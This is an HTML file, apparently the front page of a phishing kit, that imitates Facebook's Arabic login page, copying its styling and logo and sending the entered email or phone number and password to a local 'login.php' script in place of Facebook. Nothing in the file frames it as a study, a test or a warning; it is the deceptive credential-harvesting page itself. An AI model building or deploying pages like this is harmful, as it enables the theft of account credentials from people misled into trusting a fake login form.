<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - تسجيل الدخول أو الاشتراك</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { display: flex; flex-direction: column; align-items: center; text-align: center; }
        .logo { width: 240px; margin-bottom: -20px; }
        .login-box { background-color: #fff; border: 1px solid #dddfe2; border-radius: 8px; padding: 20px; width: 360px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); }
        h2 { font-size: 20px; font-weight: normal; margin-bottom: 20px; }
        input[type="text"], input[type="password"] { width: 100%; padding: 14px 16px; font-size: 17px; border: 1px solid #dddfe2; border-radius: 6px; margin-bottom: 12px; box-sizing: border-box; }
        .login-btn { width: 100%; background-color: #1877f2; color: #fff; border: none; border-radius: 6px; font-size: 20px; line-height: 48px; padding: 0 16px; font-weight: bold; cursor: pointer; }
        .forgot-password { color: #1877f2; font-size: 14px; text-decoration: none; display: block; margin-top: 12px; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 16px; }
        .create-btn { background-color: #42b72a; color: #fff; border: none; border-radius: 6px; font-size: 17px; line-height: 48px; padding: 0 16px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="container">
        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook Logo" class="logo">
        <div class="login-box">
            <h2>تسجيل الدخول إلى فيسبوك</h2>
            <form action="login.php" method="POST">
                <input type="text" name="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
                <input type="password" name="password" placeholder="كلمة السر" required>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot-password">هل نسيت كلمة السر؟</a>
            <div class="divider"></div>
            <button class="create-btn">إنشاء حساب جديد</button>
        </div>
    </div>
</body>
</html>
